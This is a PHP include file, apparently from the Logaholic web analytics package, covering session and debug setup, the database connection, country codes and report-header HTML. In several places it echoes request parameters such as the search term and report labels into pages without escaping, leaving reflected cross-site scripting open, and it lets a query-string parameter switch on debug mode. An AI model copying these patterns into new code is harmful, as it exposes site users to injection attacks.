<?php
/* Logaholic Web Analytics software             Copyright(c) 2005-2011 Logaholic B.V.
 *                                                               All rights Reserved.
 * This code is subject to the Logaholic license. Unauthorized copying is prohibited.
 * support@logaholic.com                         http://www.logaholic.com/License.txt
*/ 

// core util function consolidation; aids in customization
require_once "core_factory.php";

//This file includes the software version and db version numbers
require_once("includes/version.php"); 

//error reporting
if (LOGAHOLIC_VERSION_STATUS=="release") {  
    error_reporting(E_ALL & ~E_NOTICE);    
} else {
    error_reporting(E_ALL);
}

@ini_set('session.cookie_domain',$_SERVER['HTTP_HOST']);
Logaholic_sessionStart();

// If the debug parameter was passed in, then set it sticky in the session (either on or off).

if (isset($_GET["debug"])) {
    if ($_GET["debug"]=="off") {
        $_SESSION["debug"] = "";
    } else {
	    $_SESSION["debug"] = $_GET["debug"];
    }
}
if (isset($_SESSION["debug"])) {
	$debug = $_SESSION["debug"];
}

global $lang;
$lang_has_changed = Logaholic_hasLangChanged();
$lang = Logaholic_setLang();

/**
* Default Timezone. We need to set a default or we get warnings
*/
if (function_exists("date_default_timezone_get")) {
    $system_timezone = @date_default_timezone_get();
    if ($system_timezone!="") {
        date_default_timezone_set("$system_timezone");    
    }
}    

// All database errors will be raised as errors.  No need for special handling.
require_once("components/adodb/adodb-errorhandler.inc.php");  
// Use adodb for database work.
require_once("components/adodb/adodb.inc.php");

@include_once("user_settings.php");  // This is an optional file that can have several settings in it for user settings.
// -- Possible user_settings value --
// $do_today_as_yesterday - set this to true to do the today page as if it was midnight minus 1 second of yesterday.
// functions: do_extra_visual_mode_url_parse and do_extra_visual_mode_page_parse that are called during visual page mode parsing to help site-specific code
require_once("markup.php");

// Include siteprofile class
include_once "includes/siteprofile.php";
// Turn on error handling...
@include_once("errorhandling.inc.php");
$errorHandler = @(new clsErrorHandle());

if(isset($_GET["new_ui"])) { 
	$_SESSION['new_ui'] = $_GET['new_ui'];
	//setCookie("new_ui",$_GET['new_ui'],(time()+(365*86400)),"/");
	$new_ui = $_GET['new_ui'];
}
if(isset($_SESSION['new_ui'])) { 
	$new_ui = $_SESSION['new_ui']; 
} else {
	$new_ui = 1;
	$_SESSION['new_ui'] = 1;	
}
SecurityCheck($new_ui);

if (isset($_REQUEST["trafficsource"])) { $_SESSION["trafficsource"] = $_REQUEST["trafficsource"]; }

// Pull in some default values from the URL.
$conf = isset($conf) ? $conf : @$_REQUEST["conf"];
SecurityCheck($conf);
$from = @$_REQUEST["from"];
SecurityCheck(@$from);
$to = @$_REQUEST["to"];
SecurityCheck(@$to);
$limit = @$_REQUEST["limit"];
SecurityCheck(@$limit);
$editconf=@$_REQUEST["editconf"];
SecurityCheck(@$editconf);

// Visitor Identification Methods
define("VIDM_IPADDRESS", 1);  	// IP Address only
define("VIDM_IPPLUSAGENT", 2);  // IP address + user agent
define("VIDM_COOKIE", 3);  // User cookie - we don't support this yet!

$vidmethods[VIDM_IPADDRESS] = "IP Address Only";
$vidmethods[VIDM_IPPLUSAGENT] = "IP Address and User Agent";
$vidmethods[VIDM_COOKIE] = "Cookie based"; 

// What databases do we support?
//$supported_databases = array("mysql" => "MySQL (4.1 or higher recommended)", "sqlite" => "SQLite (embedded)");                             if (!defined("_ENABLE_IMPORTANT_PARAMETER_EDITOR_"))  { exit(); }
$supported_databases = array("mysql" => "MySQL (4.1 or higher recommended)"); 

$tableheaderfontcolor = "black";  // Temporary (?) to get rid of warnings.	

$validUserRequired = false;
$loginSystemExists = false;

// Log in to the database.  
if (!isset($mysqlsave)) {
	
	@include "files/global.php";
	
	if(!isset($mysqlprefix)) { $mysqlprefix = ""; }
	
	/**
	 * Database Table Constants - these constants
	 * hold the names of all the database tables used
	 * in the script.
	 */
	include_once("includes/table_definitions.php");
	
	// Are we doing the "Settings" section and we can't log in?  If so, just return now (skip the rest of common).
	$insetup = false;
	if (strpos($_SERVER["PHP_SELF"], "settings.php")!=FALSE) {
		$insetup = true;
	}
	
	if ((!isset($mysqlserver)) && (!$insetup)) {
		die("Global database variables aren't set.  Please run <a href=install.php>installation</a>.");
	}
	
	if (!isset($databasedriver) || (!$databasedriver)) {
		$databasedriver = "mysql";
	}
  
	if ($databasedriver == "mysql") {
        if (function_exists("mysqli_connect")) {
			$db = ADONewConnection("mysqli");
		} else {
			$db = ADONewConnection("mysql");
		}
	} else if ($databasedriver = "sqlite") {
		if (phpversion() >= "5.0.0") {
			$db = ADONewConnection("pdo_sqlite");
		} else {
		  /**
		  * PhpEd needs some help figuring out the class type, since ADONewConnection returns an abstraction.
		  * @var ADOConnection 
		  */ 
			$db = ADONewConnection("sqlite");
		}
	} else {
		die("Database driver: ".$databasedriver." not supported.");
	}
    
    @$db->Connect($mysqlserver,$mysqluname,$mysqlpw, $DatabaseName);
    if (!$db->IsConnected()) {
		if (!$insetup) {
			die("Couldn't connect to database " . $db->ErrorMsg());		
		} else {
			return; // We're in the setup routine and we can't log in.  Let's exit this bad boy!
		}
	} 

	$vnum = $db->ServerInfo();
	$vnumfull = $vnum["version"]; 
    $vnum = substr($vnum["version"],0,3);    
		
  if (($databasedriver == "mysql") && ($vnum < "4.1")) {
  	$supports_correlated_subselects = false;
	} else {
  	$supports_correlated_subselects = true;
	}	
	
	// $db = sqlite_open('mydb.sqlite', 0666, $sqliteerror);
	// sqlite_query($db, );
	// If the user login system exists, then try and access it.   (The @ supressess the error if it doesn't exist).
	if (!@$running_from_command_line) {
        @include_once("user_login/login.inc.php");
        // if we are not an admin, we are not allowed to do debug mode 
        if (($validUserRequired) && (!$session->isAdmin())) {
            if ($debug) {
                $_SESSION["debug"] = "";
                echo "<font color=red>Debug mode is only allowed for admin users!</font>";
                exit();    
            }
        }
		
    }

	// If the debug parameter was passed in, then set it sticky in the session (either on or off).
	// ** NOTE ** This session access needs to be *after* the user_login include, because that
	// actually starts the session.
	
	// Passing debug=0 or debug=off will turn off debug mode.       
	if (isset($_SESSION["debug"]) && ($_SESSION["debug"] != 0) && (strtolower($_SESSION["debug"]) != "off")) {
		$debug = $_SESSION["debug"];
		$db->debug = true;
	}
	
	// Check to see the version number of the database schema.  If it needs to be updated then load that file
	$cur_dbver = getGlobalSetting("DB_MetadataVersion", 0.00);
	
    //echo "we have just got a curdb version of $cur_dbver";
	if ($cur_dbver < CURRENT_DB_VERSION) {
		logDebugMessage("Metadata version update needed.  Current: $cur_dbver, Required: ".CURRENT_DB_VERSION); 
		// We should update.  For the current build, required and minimum versions are the same - so just *do* the update.
		
		include_once "version_check.php";
	}
    if (($loginSystemExists ==true) && (getGlobalSetting("DB_UserDataVersion", 0.00) < USER_DB_VERSION)) {
        //echoDebug("doing version check because of user table");
        include_once "version_check.php";            
    }
    
    # Check if we should load IP encoding for german market
    if (@$ipencoding==true) {
        include_once("includes/spqr.php");
    } 
    
}

@require_once("includes/hide.php");
$cnames = CountryNames();
require_once "includes/dateselector.php";
logDebugMessage(_LOADING_PAGE." ".@$_SERVER['SCRIPT_NAME']);
// Are we processing a login request?
if ($validUserRequired) {
	require_once "user_login/process.php";
	/* Initialize process */
	$process = new Process;
}

// Setup template
include_once "templates/template.php";
if(!empty($_SESSION['new_ui'])){
	include_once "templates/template_v3.php";
	$template = new Template_v3();
}else{
	include_once "templates/template_v2.php";
	$template = new Template_v2();
}


# this adds json support to PHP versions that don't have it
if(!function_exists('json_encode')) {
    include_once("components/json/JSON.php");
    $GLOBALS['JSON_OBJECT'] = new Services_JSON();
    function json_encode($value)
    {
        return $GLOBALS['JSON_OBJECT']->encode($value); 
    }
    
    function json_decode($value, $assoc = false)
    {
		if ($assoc == true) {
			return stdToAssoc($GLOBALS['JSON_OBJECT']->decode($value));
		} else {
			return $GLOBALS['JSON_OBJECT']->decode($value);
		}
    }
}

# this adds class based reports
if (file_exists("includes/report.php")) {
    include_once "includes/report.php";
}

if ($lang_has_changed==true) {
	deleteProfileData($conf, $conf.".cache\_%");
}

if(isset($dont_close_session) == false) {
	if (isset($profile) && $profile->profileloaded && ($profile->structure_version < CURRENT_PROFILE_STRUCTURE_VERSION)) {
		# don't close the session we need to upgrade the profile structure so we need a session
	} else {
		session_write_close();
	}
}

function getmicrotime() {
	list($usec, $sec) = explode(" ", microtime()); 
	return ((float)$usec + (float)$sec); 
}


function CountryNames() {
    //set up country names;
    $cnames[_UNKNOWN]=_UNKNOWN;
    $cnames["A1"]=_A1;
    $cnames["A2"]=_A2;
    $cnames["AD"]=_AD;
    $cnames["AE"]=_AE;
    $cnames["AF"]=_AF;
    $cnames["AG"]=_AG;
    $cnames["AI"]=_AI;
    $cnames["AL"]=_AL;
    $cnames["AM"]=_AM;
    $cnames["AN"]=_AN;
    $cnames["AO"]=_AO;
    $cnames["AP"]=_AP;
    $cnames["AQ"]=_AQ;
    $cnames["AR"]=_AR;
    $cnames["AS"]=_AS;
    $cnames["AT"]=_AT;
    $cnames["AU"]=_AU;
    $cnames["AW"]=_AW;
    $cnames["AX"]=_AX;
    $cnames["AZ"]=_AZ;
    $cnames["BA"]=_BA;
    $cnames["BB"]=_BB;
    $cnames["BD"]=_BD;
    $cnames["BE"]=_BE;
    $cnames["BF"]=_BF;
    $cnames["BG"]=_BG;
    $cnames["BH"]=_BH;
    $cnames["BI"]=_BI;
    $cnames["BJ"]=_BJ;
    $cnames["BM"]=_BM;
    $cnames["BN"]=_BN;
    $cnames["BO"]=_BO;
    $cnames["BR"]=_BR;
    $cnames["BS"]=_BS;
    $cnames["BT"]=_BT;
    $cnames["BV"]=_BV;
    $cnames["BW"]=_BW;
    $cnames["BY"]=_BY;
    $cnames["BZ"]=_BZ;
    $cnames["CA"]=_CA;
    $cnames["CC"]=_CC;
    $cnames["CD"]=_CD;
    $cnames["CF"]=_CF;
    $cnames["CG"]=_CG;
    $cnames["CH"]=_CH;
    $cnames["CI"]=_CI;
    $cnames["CK"]=_CK;
    $cnames["CL"]=_CL;
    $cnames["CM"]=_CM;
    $cnames["CN"]=_CN;
    $cnames["CO"]=_CO;
    $cnames["CR"]=_CR;
    $cnames["CU"]=_CU;
    $cnames["CV"]=_CV;
    $cnames["CX"]=_CX;
    $cnames["CY"]=_CY;
    $cnames["CZ"]=_CZ;
    $cnames["DE"]=_DE;
    $cnames["DJ"]=_DJ;
    $cnames["DK"]=_DK;
    $cnames["DM"]=_DM;
    $cnames["DO"]=_DO;
    $cnames["DZ"]=_DZ;
    $cnames["EC"]=_EC;
    $cnames["EE"]=_EE;
    $cnames["EG"]=_EG;
    $cnames["EH"]=_EH;
    $cnames["ER"]=_ER;
    $cnames["ES"]=_ES;
    $cnames["ET"]=_ET;
    $cnames["EU"]=_EU;
    $cnames["FI"]=_FI;
    $cnames["FJ"]=_FJ;
    $cnames["FK"]=_FK;
    $cnames["FM"]=_FM;
    $cnames["FO"]=_FO;
    $cnames["FR"]=_FR;
    $cnames["FX"]=_FX;
    $cnames["GA"]=_GA;
    $cnames["GB"]=_GB;
    $cnames["GD"]=_GD;
    $cnames["GE"]=_GE;
    $cnames["GF"]=_GF;
    $cnames["GH"]=_GH;
    $cnames["GG"]=_GG;
    $cnames["GI"]=_GI;
    $cnames["GL"]=_GL;
    $cnames["GM"]=_GM;
    $cnames["GN"]=_GN;
    $cnames["GP"]=_GP;
    $cnames["GQ"]=_GQ;
    $cnames["GR"]=_GR;
    $cnames["GS"]=_GS;
    $cnames["GT"]=_GT;
    $cnames["GU"]=_GU;
    $cnames["GW"]=_GW;
    $cnames["GY"]=_GY;
    $cnames["HK"]=_HK;
    $cnames["HM"]=_HM;
    $cnames["HN"]=_HN;
    $cnames["HR"]=_HR;
    $cnames["HT"]=_HT;
    $cnames["HU"]=_HU;
    $cnames["ID"]=_ID;
    $cnames["IE"]=_IE;
    $cnames["IL"]=_IL;
    $cnames["IM"]=_IM;
    $cnames["IN"]=_IN;
    $cnames["IO"]=_IO;
    $cnames["IQ"]=_IQ;
    $cnames["IR"]=_IR;
    $cnames["IS"]=_IS;
    $cnames["IT"]=_IT;
    $cnames["JE"]=_JE;
    $cnames["JM"]=_JM;
    $cnames["JO"]=_JO;
    $cnames["JP"]=_JP;
    $cnames["KE"]=_KE;
    $cnames["KG"]=_KG;
    $cnames["KH"]=_KH;
    $cnames["KI"]=_KI;
    $cnames["KM"]=_KM;
    $cnames["KN"]=_KN;
    $cnames["KP"]=_KP;
    $cnames["KR"]=_KR;
    $cnames["KW"]=_KW;
    $cnames["KY"]=_KY;
    $cnames["KZ"]=_KZ;
    $cnames["LA"]=_LA;
    $cnames["LB"]=_LB;
    $cnames["LC"]=_LC;
    $cnames["LI"]=_LI;
    $cnames["LK"]=_LK;
    $cnames["LR"]=_LR;
    $cnames["LS"]=_LS;
    $cnames["LT"]=_LT;
    $cnames["LU"]=_LU;
    $cnames["LV"]=_LV;
    $cnames["LY"]=_LY;
    $cnames["MA"]=_MA;
    $cnames["MC"]=_MC;
    $cnames["MD"]=_MD;
    $cnames["ME"]=_ME;
    $cnames["MG"]=_MG;
    $cnames["MH"]=_MH;
    $cnames["MK"]=_MK;
    $cnames["ML"]=_ML;
    $cnames["MM"]=_MM;
    $cnames["MN"]=_MN;
    $cnames["MO"]=_MO;
    $cnames["MP"]=_MP;
    $cnames["MQ"]=_MQ;
    $cnames["MR"]=_MR;
    $cnames["MS"]=_MS;
    $cnames["MT"]=_MT;
    $cnames["MU"]=_MU;
    $cnames["MV"]=_MV;
    $cnames["MW"]=_MW;
    $cnames["MX"]=_MX;
    $cnames["MY"]=_MY;
    $cnames["MZ"]=_MZ;
    $cnames["NA"]=_NA;
    $cnames["NC"]=_NC;
    $cnames["NE"]=_NE;
    $cnames["NF"]=_NF;
    $cnames["NG"]=_NG;
    $cnames["NI"]=_NI;
    $cnames["NL"]=_NL;
    $cnames["NO"]=_NO;
    $cnames["NP"]=_NP;
    $cnames["NR"]=_NR;
    $cnames["NU"]=_NU;
    $cnames["NZ"]=_NZ;
    $cnames["OM"]=_OM;
    $cnames["PA"]=_PA;
    $cnames["PE"]=_PE;
    $cnames["PF"]=_PF;
    $cnames["PG"]=_PG;
    $cnames["PH"]=_PH;
    $cnames["PK"]=_PK;
    $cnames["PL"]=_PL;
    $cnames["PM"]=_PM;
    $cnames["PN"]=_PN;
    $cnames["PR"]=_PR;
    $cnames["PS"]=_PS;
    $cnames["PT"]=_PT;
    $cnames["PW"]=_PW;
    $cnames["PY"]=_PY;
    $cnames["QA"]=_QA;
    $cnames["RE"]=_RE;
    $cnames["RO"]=_RO;
    $cnames["RS"]=_RS;
    $cnames["RU"]=_RU;
    $cnames["RW"]=_RW;
    $cnames["SA"]=_SA;
    $cnames["SB"]=_SB;
    $cnames["SC"]=_SC;
    $cnames["SD"]=_SD;
    $cnames["SE"]=_SE;
    $cnames["SG"]=_SG;
    $cnames["SH"]=_SH;
    $cnames["SI"]=_SI;
    $cnames["SJ"]=_SJ;
    $cnames["SK"]=_SK;
    $cnames["SL"]=_SL;
    $cnames["SM"]=_SM;
    $cnames["SN"]=_SN;
    $cnames["SO"]=_SO;
    $cnames["SR"]=_SR;
    $cnames["ST"]=_ST;
    $cnames["SV"]=_SV;
    $cnames["SY"]=_SY;
    $cnames["SZ"]=_SZ;
    $cnames["TC"]=_TC;
    $cnames["TD"]=_TD;
    $cnames["TF"]=_TF;
    $cnames["TG"]=_TG;
    $cnames["TH"]=_TH;
    $cnames["TJ"]=_TJ;
    $cnames["TK"]=_TK;
    $cnames["TL"]=_TL;
    $cnames["TM"]=_TM;
    $cnames["TN"]=_TN;
    $cnames["TO"]=_TO;
    $cnames["TR"]=_TR;
    $cnames["TT"]=_TT;
    $cnames["TV"]=_TV;
    $cnames["TW"]=_TW;
    $cnames["TZ"]=_TZ;
    $cnames["UA"]=_UA;
    $cnames["UG"]=_UG;
    $cnames["UM"]=_UM;
    $cnames["US"]=_US;
    $cnames["UY"]=_UY;
    $cnames["UZ"]=_UZ;
    $cnames["VA"]=_VA;
    $cnames["VC"]=_VC;
    $cnames["VE"]=_VE;
    $cnames["VG"]=_VG;
    $cnames["VI"]=_VI;
    $cnames["VN"]=_VN;
    $cnames["VU"]=_VU;
    $cnames["WF"]=_WF;
    $cnames["WS"]=_WS;
    $cnames["YE"]=_YE;
    $cnames["YT"]=_YT;
    $cnames["ZA"]=_ZA;
    $cnames["ZM"]=_ZM;
    $cnames["ZW"]=_ZW;
    return $cnames;
}

function showVersion() {
    global $databasedriver,$vnumfull;
    if (function_exists('encodeSPQR')) { $extra=" for Germany"; } else { $extra=""; }  
    echo _YOU_ARE_USING_LOGAHOLIC.' '._LOGAHOLIC_PRODUCTNAME.' '._LOGAHOLIC_TRIAL.'version '.LOGAHOLIC_VERSION_NUMBER.$extra.' '._WITH_PHP_VERSION.' '.phpversion().' '._AND_DATABASE.' '.$databasedriver.' '._VERSION.' '.$vnumfull;
}

function StatsTable($from,$to,$showfields,$labels,$query,$drilldown="",$filter="") {
	
	global $data;
	global $db;
    
    if ($query=="data array") {
        // it's already an array, pass it on immediately
        return ArrayStatsTable($from, $to, $showfields, $labels, $query, $drilldown, $filter);   
    }
    // This reads the data from the array
	$data = array(); // Initialize it to an array just in case we don't have any results back.
    if ($query=="") {
        echo "<br><br>"._ERROR_QUERY_EMPTY." ($labels)<br>";   
    } else {

        $db->SetFetchMode(ADODB_FETCH_NUM);
	    $result = $db->Execute($query);
	    $data = $result->GetArray();
        $db->SetFetchMode(ADODB_FETCH_BOTH);
	    return ArrayStatsTable($from, $to, $showfields, $labels, $query, $drilldown, $filter);
    }
}

function PrintMiniReportHeader() {
    global $labels,$t,$tableheaderfontcolor;
    //mini header version
    if (strpos($_SERVER["PHP_SELF"], "index.php")!==FALSE) {
        // if we're on the today page, lets add a link to the full report (but take out the "Today's" part so it just goes to the full report)
        if (in_array($labels,$t)) {
            // it's a today report
            $goto_label="";
            if($labels == _TODAYS_TOP_PAGES)
            {
                $goto_label = _TOP_PAGES;
            }
            if($labels == _TODAYS_TOP_KEYWORDS)
            {
                $goto_label = _TOP_KEYWORDS;
            }
            if($labels == _TODAYS_TOP_COUNTRIES)
            {
                $goto_label = _TOP_COUNTRIES;
            }
            if($labels == _TODAYS_TOP_REFERRERS)
            {
                $goto_label = _TOP_REFERRERS;
            }
            if($labels == _TODAYS_TOP_VISITORS)
            {
                $goto_label = _MOST_ACTIVE_USERS;
            }
            if($labels == _PERFORMANCE_TODAY)
            {
                $goto_label = _OVERALL_PERFORMANCE;
            }
            if($labels == _PERFORMANCE_THIS_MONTH)
            {
                $goto_label = _OVERALL_PERFORMANCE;
            }
            if($labels == _TIME_ON_SITE_TODAY)
            {
                $goto_label= _VISIT_DURATION;
            }           
            if ($goto_label) { 
                $labels = "<a title=\""._CLICK_VIEW_FULL_REPORT_NEW_WIN."\" class=\"nodec4\" href=\"javascript:Report2('$goto_label');\">$labels</a>";
            }   
        } else {
            $labels = "<a title=\""._CLICK_VIEW_FULL_REPORT_NEW_WIN."\" class=\"nodec4\" href=\"javascript:Report2('$labels');\">$labels</a>";
        }
    }
    ?>
    <table cellspacing=0 cellpadding=2 border=0 width="100%">
    <tr><td colspan=15 class="MoveableToplinegreen">
        <font color="<?php echo $tableheaderfontcolor; ?>" size="+1"><?php echo str_replace("%20"," ",$labels); echo " ".printSegmentName(); ?></font>
    </td></tr>
    </table>
    <?php   
}

function printSegmentName() {
    global $trafficsource;
    if ($trafficsource > 0) {
        $source = getTrafficSourceByID($trafficsource);
        $segmentname = "<i>("._FILTERS.": <b>".$source["sourcename"]."</b>)</i>";
    } else {
        $segmentname="";   
    }
    return $segmentname;    
}

function PrintFullReportHeader() {
    global $to,$from,$conf,$status,$help,$print,$profile,$limit,$formemail,$helpdiv,$validUserRequired,$tableheaderfontcolor,$labels,$addlabel,$trafficsource,$cachename,$country,$roadto;
    $nicefrom = date("D, d M Y / H:i",$from);
    $niceto = date("D, d M Y / H:i",$to);
    $segmentname = printSegmentName();
    ?>
    <table cellspacing=0 cellpadding=2 border=0 width="100%">
    <tr><td colspan=15 class="toplinegreen">
        <?php
        if (strpos($_SERVER["PHP_SELF"], "reports.php")!==FALSE) { 
            if (!$print) {
                
                echo "<a href=\"reports.php?conf=$conf&notrail=$cachename\"><img src=images/icons/cancel.gif width=16 height=16 align=right border=0 alt=\"close\"></a>";
                
                echo "<a target=_blank href=\"reports.php?conf=$conf&to=$to&from=$from&labels=$labels&limit=$limit&submit=Report&print=1\"><img src=images/icons/printer.png width=16 height=16 align=right border=0 alt=\""._PRINTABLE_REPORT."\"></a>";
                
                echo "<a href=\"javascript:mailbox('mailer$cachename')\"><img src=images/icons/email_go.gif width=16 height=16 align=right border=0 alt=\""._EMAIL_REPORT."\"></a>";
                
                echo "<a href=\"reports.php?conf=$conf&to=$to&from=$from&labels=$labels";
                if (@$status) { echo "&status=$status"; }
                if (@$country) { echo "&country=$country"; }
                if (@$roadto) { echo "&roadto=$roadto"; } 
                echo "&limit=$limit&submit=Report&csvexport=1\"><img src=images/icons/csvexport.gif width=16 height=16 align=right border=0 alt=\""._SAVE_REPORT_CSV."\"></a>";
                 
          if (!$validUserRequired && (!isset($_SERVER["PHP_AUTH_USER"]))) {
            echo "<div id=\"mailer$cachename\" style=\"display : none; line-height : 18px; position : absolute; top:100px;left:250px;background-color:#f0f0f0;border: 2px solid red;z-index:10;padding:15px;\"><img src=\"images/icons/email_go.gif\" alt=\"\" align=left> "._ONLY_WHEN_PASSWORD_PROTECTED."</div>";
          } else {
              ?>        
                <div id="mailer<?php echo $cachename;?>" class="mailer" style="display : none;">
                  <form method=post action=reports.php>
                  <table cellpadding=5 cellspacing=5 width=450><tr><td colspan=2 class=smallborder>
                  <a href="javascript:mailbox('mailer<?php echo $cachename;?>')"><img src=images/icons/cancel.gif border=0 align=right></a><img src=images/icons/email_go.gif width=16 height=16 align=left> &nbsp;&nbsp;<b><?php echo _SEND_THIS_REPORT_AS_EMAIL;?>:</b></td></tr>
                  <tr><td title="<?php echo _EMAIL_FROM;?>"><?php echo _YOUR_EMAIL;?>:</td><td title="<?php echo _EMAIL_FROM;?>"> <input type=text name=fromemail size=40></td></tr>
                  <tr><td title="<?php echo _EMAIL_TO;?>"><?php echo _THEIR_EMAIL;?>:</td><td title="<?php echo _EMAIL_TO;?>"> <input type=text name=formemail size=40></td></tr>
                  <tr><td><?php echo _SUBJECT;?>:</td><td> <input type=text name=subject value="<?php  echo $profile->confdomain . " " .$labels; ?>" size=40></td></tr>
                  <tr><td><?php echo _MESSAGE;?>:</td><td> <textarea name=message cols=40 rows=7></textarea></td></tr>
                <tr><td></td><td>                   
                <input type=hidden name=conf value="<?php echo $conf;?>">
                <input type=hidden name=from value="<?php echo $from;?>">
                <input type=hidden name=to value="<?php echo $to;?>">
                <input type=hidden name=labels value="<?php echo $labels;?>">
                <input type=hidden name=limit value="<?php echo $limit;?>">
                  <input type=submit value="Send" onclick="javascript:mailbox('mailer<?php echo $cachename;?>')"><p>
          <?php echo _YOU_WILL_RECEIVE_COPY_OF_EMAIL;?></p>
          </td></tr></table>
                </form>        
                </div>
                <?php      
            }
            
          }
        }
        ?>
        <span class="tableheaderfont">
        <?php 
        if (!isset($helpdiv)) {
            $helpdiv = "helptxt$cachename";
        }
        echo str_replace("%20"," ",$labels); echo "</span>$addlabel ";
        echo $segmentname;
        if (!$print) {
          echo "<font size=-1> &nbsp;<sup><a href=\"javascript:helpbox('".$helpdiv."')\" id=\"greenhelplink\" class=greenlink>"._HELP."</a></sup>";
        }
        echo "<br><b>"._DATE_FROM."</b> $nicefrom <b>"._DATE_TO."</b> $niceto";
        echo "</font>";
        ?>
            <div id="<?php echo $helpdiv;?>" style="display : none; line-height : 18px; position : relative;">
            &nbsp;<br><?php echo $help;?>
        <div style="padding:12px;"><a href="javascript:helpbox('<?php echo $helpdiv;?>')" class=graylink><?php echo _CLOSE_HELP_TEXT;?></a></div>
        </div>
    </td></tr></table>
    <?php    
}

function ReportHeaderButtons() {
	global $print, $conf, $to, $from, $labels, $limit, $cachename, $status, $validUserRequired, $_SERVER, $profile, $help;
	
	if (strpos($_SERVER["PHP_SELF"], "reports.php")!==FALSE) {
		if (!$print) {
			echo "<a target='_blank' href='reports.php?conf={$conf}&to={$to}&from={$from}&labels={$labels}&limit={$limit}&submit=Report&print=1' title=\""._PRINTABLE_REPORT."\"><img src='images/icons/printer.png'></a>";
			
			echo "<a class='mail_btn' title=\""._EMAIL_REPORT."\"><img src='images/icons/email_go.gif'></a>";
			// href=\"javascript:mailbox('mailer{$cachename}')\"
			echo "<a href='reports.php?conf={$conf}&to={$to}&from={$from}&labels={$labels}";
			if (@$status) { echo "&status=$status"; }
			echo "&limit={$limit}&submit=Report&csvexport=1' title=\""._SAVE_REPORT_CSV."\"><img src='images/icons/csvexport.gif'></a>";
			
			echo "<a class='help_btn' title='Open Help'><img src='images/icons/help.png'></a>";
			echo "<div class='clear'></div>";
			
			if (!$validUserRequired && (!isset($_SERVER["PHP_AUTH_USER"]))) {
				echo "<div id=\"mailer{$cachename}\" style=\"display : none; line-height : 18px; position : absolute; top:100px;left:250px;background-color:#f0f0f0;border: 2px solid red;z-index:10;padding:15px;\"><img src=\"images/icons/email_go.gif\" alt=\"\" align=left> "._ONLY_WHEN_PASSWORD_PROTECTED."</div>";
			} else {
				?>
				<div id="mailer<?php echo $cachename;?>" class="mailer">
					<form method=post action=reports.php target=_blank>
						<table cellpadding=5 cellspacing=5 width=450>
							<tr><td colspan=2 class=smallborder>
								<a class='mail_btn'><img src=images/icons/cancel.gif border=0 align=right></a><img src=images/icons/email_go.gif width=16 height=16 align=left> &nbsp;&nbsp;<b><?php echo _SEND_THIS_REPORT_AS_EMAIL;?>:</b>
								<?php //  href="javascript:mailbox('mailer<?php echo $cachename;  ')" ?>
							</td></tr>
							<tr><td title="<?php echo _EMAIL_FROM;?>"><?php echo _YOUR_EMAIL;?>:</td><td title="<?php echo _EMAIL_FROM;?>"> <input type=text name=fromemail size=40></td></tr>
							<tr><td title="<?php echo _EMAIL_TO;?>"><?php echo _THEIR_EMAIL;?>:</td><td title="<?php echo _EMAIL_TO;?>"> <input type=text name=email size=40></td></tr>
							<tr><td><?php echo _SUBJECT;?>:</td><td> <input type=text name=subject value="<?php  echo $profile->confdomain . " " .$labels; ?>" size=40></td></tr>
							<tr><td><?php echo _MESSAGE;?>:</td><td> <textarea name=message cols=40 rows=7></textarea></td></tr>
							<tr><td></td><td> 
							<input type=hidden name=conf value="<?php echo $conf;?>">
							<input type=hidden name=from value="<?php echo $from;?>">
							<input type=hidden name=to value="<?php echo $to;?>">
							<input type=hidden name=labels value="<?php echo $labels;?>">
							<input type=hidden name=limit value="<?php echo $limit;?>">
							<input type=hidden name=nocache value="1">
							<input type=hidden name=print value="1">
							<input type=submit value="Send" onclick="javascript:mailbox('mailer<?php echo $cachename;?>')"><p>
							<?php echo _YOU_WILL_RECEIVE_COPY_OF_EMAIL;?></p>
							</td></tr>
						</table>
					</form>        
				</div>
				<?php
			}
		}
	}
}

function UIDIalogButtons($show = array()) {
	$buttons = "<div class='dialog-controls'>";
	if(!empty($show)) {
		foreach($show as $button) {
			switch($button) {
				case "close":
					$buttons .= "<a title='Close this report' href='#' class='close'></a>";
					break;
				case "minimize":
					$buttons .= "<a title='Minimize This report' href='#' class='minimize'></a>";
					break;
				case "reload":
					$buttons .= "<a title='reload this report' href='#' class='reload'></a>";
					break;
				case "dialogsettings":
					$buttons .= "<a title='Change setting for this report' href='#' class='dialogsettings'></a>";
					break;
				default;
					break;
			}
		}
	} else {
		$buttons .= "<a title='Close this report' href='#' class='close'></a> <a title='Minimize This report' href='#' class='minimize'></a> <a title='reload this report' href='#' class='reload'></a> <a title='Change setting for this report' href='#' class='dialogsettings'></a>";
		$buttons .= "<a title='Expand this report' href='#' class='expand_switch expand'></a>";
	}
	$buttons .= "</div>";
	return $buttons;
}

/* Here starts a Logaholic 30 Report Window */
function PrintNewReportHeader() {
    global $to,$from,$conf,$status,$help,$print,$profile,$limit,$email,$helpdiv,$validUserRequired,$tableheaderfontcolor,$labels,$addlabel,$trafficsource,$cachename,$search,$searchmode,$roadto;
    
    $nicefrom = date("d M Y",$from);
    $niceto = date("d M Y",$to);
    
    if ($trafficsource > 0) {
        $source = getTrafficSourceByID($trafficsource);
        $segmentname = $source['sourcename'];
    } else {
        $segmentname="";   
    }
	if ($searchmode == "like") {
        $nice_searchmode = "contain";
    } else {
        $nice_searchmode = "do not contain";
    }
	echo "<div class='report-header'>";
		echo "<div class='report-header-content'>";
			echo "{$nicefrom} - {$niceto}";
			if(!empty($addlabel)){ echo "<span>{$addlabel}</span> "; }
			if(!empty($segmentname)){ echo "<span>Segment: {$segmentname}</span> "; }
			if(!empty($search)){ echo "<span>Results that {$nice_searchmode} '{$search}'</span> "; }
			if(!empty($roadto)){ echo "<span>Using target page '{$roadto}'</span> "; }
			
			echo "<div class='report-header-buttons'>";
				echo ReportHeaderButtons();
			echo "</div>";
			echo "<div class='help_content'>";
				echo "{$help}";
				echo "<div style='padding: 12px;'><a class='help_btn text'>"._CLOSE_HELP_TEXT."</a></div>";
			echo "</div>";
		echo "</div>";
	echo "</div>";
}

function ArrayStatsTable($from,$to,$showfields,$labels,$query="",$drilldown="",$filter="",$report_graph="") {
	global $conf,$mini,$nototal,$addlabel,$nograph,$status,$agent,$help,$print,$cnames,$profile,$limit,$formemail,$helpdiv,$gi,$search,$searchmode,$addgraph, $opengraph;
	global $data, $cachename, $bchart;
	
	$tabletotalcolor="silver";
	$tableheadercolor="#d5ffd5";
	$tableheaderfontcolor="black";
	$tablemaincolor="white";
	$header = explode(",",$showfields);
    //$table_id=md5('ReportTable'.$labels.$cachename);
    $table_id=md5('ReportTable'.$labels.$cachename.time());
    //$table_id=md5('ReportTable'.$labels.$cachename.rand(0,1000));
    
